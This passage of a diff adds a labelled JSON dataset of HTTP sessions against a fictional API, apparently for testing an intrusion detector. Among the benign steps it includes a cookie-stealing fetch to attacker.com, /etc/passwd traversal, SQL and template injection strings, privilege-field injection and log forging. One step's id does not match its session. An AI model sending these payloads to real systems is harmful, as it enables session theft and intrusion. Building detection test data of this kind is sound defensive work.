+        "path": "/v1/stations/public",
+        "query": {
+          "region": "Trench's rim"
+        },
+        "headers": {
+          "Accept": "application/json",
+          "X-Debug-Header": "enabled"
+        },
+        "body": null,
+        "note": "The client includes an apostrophe in region and a debug header."
+      },
+      {
+        "id": "sess073-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician73@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess073-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_073"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess073-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-upsilon-03",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_073"
+        },
+        "body": null,
+        "note": "The user inspects an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess074",
+    "client_ip": "192.168.1.83",
+    "steps": [
+      {
+        "id": "sess074-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician74@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess074-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_074"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess074-s03",
+        "label": "malicious",
+        "method": "PUT",
+        "path": "/v1/anomalies/anomaly-phi-02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_074",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Update",
+          "user_role": "administrator"
+        },
+        "note": "The client attempts to inject a user_role privilege field."
+      },
+      {
+        "id": "sess074-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-phi-02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_074"
+        },
+        "body": null,
+        "note": "The user checks the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess075",
+    "client_ip": "192.168.1.84",
+    "steps": [
+      {
+        "id": "sess075-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician75@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess075-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_075"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess075-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/anomalies/..%2f..%2fetc%2fpasswd",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_075"
+        },
+        "body": null,
+        "note": "The client attempts directory traversal via URL encoding."
+      },
+      {
+        "id": "sess075-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-chi-03",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_075"
+        },
+        "body": null,
+        "note": "The user views an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess076",
+    "client_ip": "192.168.1.85",
+    "steps": [
+      {
+        "id": "sess076-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/stations/public",
+        "query": {},
+        "headers": {
+          "Accept": "application/json",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2)"
+        },
+        "body": null,
+        "note": "The client uses an outdated browser user agent."
+      },
+      {
+        "id": "sess076-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician76@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess076-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_076"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess076-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-psi-03",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_076"
+        },
+        "body": null,
+        "note": "The user checks an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess077",
+    "client_ip": "192.168.1.86",
+    "steps": [
+      {
+        "id": "sess077-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician77@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess077-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_077"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess077-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/anomalies/anomaly-omega-03/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_077",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "fetch('[http://attacker.com/'+document.cookie](http://attacker.com/'+document.cookie))"
+        },
+        "note": "The client attempts a script execution exfiltration payload."
+      },
+      {
+        "id": "sess077-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-omega-03",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_077"
+        },
+        "body": null,
+        "note": "The user checks the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess078",
+    "client_ip": "192.168.1.87",
+    "steps": [
+      {
+        "id": "sess078-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician78@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess078-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_078"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess078-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_078",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Report",
+          "frequency_hz": 350,
+          "notes": "[http://127.0.0.1:3306/](https://www.google.com/search?q=http://127.0.0.1:3306/)"
+        },
+        "note": "Data error: relabeled from malicious. The private address is only the visible text of a link to a public host."
+      },
+      {
+        "id": "sess078-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/sessions/recent",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_078"
+        },
+        "body": null,
+        "note": "The user views recent sessions."
+      }
+    ]
+  },
+  {
+    "session_id": "sess079",
+    "client_ip": "192.168.1.88",
+    "steps": [
+      {
+        "id": "sess079-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/stations/public",
+        "query": {
+          "region": "Ridge's slope"
+        },
+        "headers": {
+          "Accept": "application/json"
+        },
+        "body": null,
+        "note": "The client includes an apostrophe in the region query parameter."
+      },
+      {
+        "id": "sess079-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician79@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess079-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_079"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess079-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-alpha-03",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_079"
+        },
+        "body": null,
+        "note": "The user inspects an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess080",
+    "client_ip": "192.168.1.89",
+    "steps": [
+      {
+        "id": "sess080-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician80@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess080-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_080"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess080-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/anomalies/anomaly-beta-03/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_080",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "${7*7}"
+        },
+        "note": "The client attempts a template injection payload."
+      },
+      {
+        "id": "sess080-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-beta-03",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_080"
+        },
+        "body": null,
+        "note": "The user checks the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess081",
+    "client_ip": "192.168.1.90",
+    "steps": [
+      {
+        "id": "sess081-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician81@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess081-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_081"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess081-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/anomalies/anomaly-gamma-03/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_081",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "rO0ABXNyACpvcmcu..."
+        },
+        "note": "The client attempts to send serialized object data."
+      },
+      {
+        "id": "sess081-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-gamma-03",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_081"
+        },
+        "body": null,
+        "note": "The user checks the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess082",
+    "client_ip": "192.168.1.91",
+    "steps": [
+      {
+        "id": "sess082-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician82@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess082-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_082"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess082-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_082",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Record\n2026-10-28 10:43:05 CRITICAL [Security] Firewall breach",
+          "frequency_hz": 550
+        },
+        "note": "The client attempts a log stamp injection payload."
+      },
+      {
+        "id": "sess082-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/sessions/recent",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_082"
+        },
+        "body": null,
+        "note": "The user views recent sessions."
+      }
+    ]
+  },
+  {
+    "session_id": "sess083",
+    "client_ip": "192.168.1.92",
+    "steps": [
+      {
+        "id": "sess083-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/stations/public",
+        "query": {},
+        "headers": {
+          "Accept": "application/json",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"
+        },
+        "body": null,
+        "note": "The client uses an old browser user agent string."
+      },
+      {
+        "id": "sess083-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician83@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess083-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_083"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess083-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-delta-05",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_083"
+        },
+        "body": null,
+        "note": "The user checks an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess084",
+    "client_ip": "192.168.1.93",
+    "steps": [
+      {
+        "id": "sess084-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician84@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess084-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_084"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess084-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {
+          "limit": "10' OR '1'='1"
+        },
+        "headers": {
+          "Authorization": "Bearer token_084"
+        },
+        "body": null,
+        "note": "The client attempts a query injection."
+      },
+      {
+        "id": "sess084-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-epsilon-04",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_084"
+        },
+        "body": null,
+        "note": "The user checks an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess085",
+    "client_ip": "192.168.1.94",
+    "steps": [
+      {
+        "id": "sess085-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician85@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess085-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_085"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess085-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-unauthorized-55",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_085"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. The word unauthorized is only part of the id string."
+      },
+      {
+        "id": "sess085-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-zeta-05",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_085"
+        },
+        "body": null,
+        "note": "The user views a valid anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess086",
+    "client_ip": "192.168.1.95",
+    "steps": [
+      {
+        "id": "sess086-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/stations/public",
+        "query": {
+          "region": "Shelf's edge"
+        },
+        "headers": {
+          "Accept": "application/json"
+        },
+        "body": null,
+        "note": "The client includes an apostrophe in the region query parameter."
+      },
+      {
+        "id": "sess086-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician86@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess086-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_086"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess086-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-eta-04",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_086"
+        },
+        "body": null,
+        "note": "The user checks an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess087",
+    "client_ip": "192.168.1.96",
+    "steps": [
+      {
+        "id": "sess087-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician87@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess087-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_087"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess087-s03",
+        "label": "malicious",
+        "method": "PUT",
+        "path": "/v1/anomalies/anomaly-theta-04",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_087",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Update",
+          "role_id": "99"
+        },
+        "note": "The client attempts to inject an unauthorized role_id field."
+      },
+      {
+        "id": "sess087-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-theta-04",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_087"
+        },
+        "body": null,
+        "note": "The user checks the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess088",
+    "client_ip": "192.168.1.97",
+    "steps": [
+      {
+        "id": "sess088-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician88@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess088-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_088"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess088-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/anomalies/..%2f..%2fetc%2fpasswd",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_088"
+        },
+        "body": null,
+        "note": "The client attempts URL-encoded directory traversal."
+      },
+      {
+        "id": "sess088-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-iota-04",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_088"
+        },
+        "body": null,
+        "note": "The user views an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess089",
+    "client_ip": "192.168.1.98",
+    "steps": [
+      {
+        "id": "sess089-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician89@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess089-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_089"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess090-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/v1/anomalies/anomaly-kappa-03/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_089",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "alert('xss')"
+        },
+        "note": "Data error: relabeled from malicious. alert('xss') is plain text with no script tag, handler, or URL."
+      },
+      {
+        "id": "sess089-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-kappa-03",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_089"
+        },
+        "body": null,
+        "note": "The user checks the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess090",
+    "client_ip": "192.168.1.99",
+    "steps": [
+      {
+        "id": "sess090-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/stations/public",
+        "query": {},
+        "headers": {
+          "Accept": "application/json",
+          "X-Debug-Session": "active-tracing"
+        },
+        "body": null,
+        "note": "The client includes a debugging header with tracing enabled."
+      },
+      {
+        "id": "sess090-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician90@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess090-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_090"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess090-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-lambda-04",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_090"
+        },
+        "body": null,
+        "note": "The user inspects an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess091",
+    "client_ip": "192.168.2.10",
+    "steps": [
+      {
+        "id": "sess091-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician91@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess091-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_091"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess091-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_091",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Data",
+          "frequency_hz": 650,
+          "notes": "[http://127.0.0.1:80/admin](https://www.google.com/search?q=http://127.0.0.1:80/admin)"
+        },
+        "note": "Data error: relabeled from malicious. The private address is only the visible text of a link to a public host."
+      },
+      {
+        "id": "sess091-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/sessions/recent",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_091"
+        },
+        "body": null,
+        "note": "The user views recent sessions."
+      }
+    ]
+  },
+  {
+    "session_id": "sess092",
+    "client_ip": "192.168.2.11",
+    "steps": [
+      {
+        "id": "sess092-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician92@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess092-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_092"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess092-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/anomalies/anomaly-mu-03/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_092",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "${7*7}"
+        },
+        "note": "The client attempts a template injection payload."
+      },
+      {
+        "id": "sess092-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-mu-03",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_092"
+        },
+        "body": null,
+        "note": "The user checks the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess093",
+    "client_ip": "192.168.2.12",
+    "steps": [
+      {
+        "id": "sess093-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician93@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess093-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_093"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess093-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/anomalies/anomaly-nu-04/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_093",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "rO0ABXNyACpvcmcu..."
+        },
+        "note": "The client attempts to send serialized object binary streams."
+      },
+      {
+        "id": "sess093-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-nu-04",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_093"
+        },
+        "body": null,
+        "note": "The user checks the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess094",
+    "client_ip": "192.168.2.13",
+    "steps": [
+      {
+        "id": "sess094-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/stations/public",
+        "query": {
+          "region": "Abyssal's plain"
+        },
+        "headers": {
+          "Accept": "application/json"
+        },
+        "body": null,
+        "note": "The client includes an apostrophe in the region query parameter."
+      },
+      {
+        "id": "sess094-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician94@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess094-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_094"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess094-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-xi-04",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_094"
+        },
+        "body": null,
+        "note": "The user inspects an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess095",
+    "client_ip": "192.168.2.14",
+    "steps": [
+      {
+        "id": "sess095-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician95@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess095-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_095"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess095-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_095",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Log entry\n2026-10-28 10:43:06 ALERT [System] Kernel panic simulated",
+          "frequency_hz": 750
+        },
+        "note": "The client attempts a log stamp injection payload."
+      },
+      {
+        "id": "sess095-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/sessions/recent",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_095"
+        },
+        "body": null,
+        "note": "The user views recent sessions."
+      }
+    ]
+  },
+  {
+    "session_id": "sess096",
+    "client_ip": "192.168.2.15",
+    "steps": [
+      {
+        "id": "sess096-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician96@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess096-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_096"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess096-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-omicron-04",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_096"
+        },
+        "body": null,
+        "note": "The user opens an anomaly object."
+      },
+      {
+        "id": "sess096-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-omicron-05",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_096"
+        },
+        "body": null,
+        "note": "The user checks another anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess097",
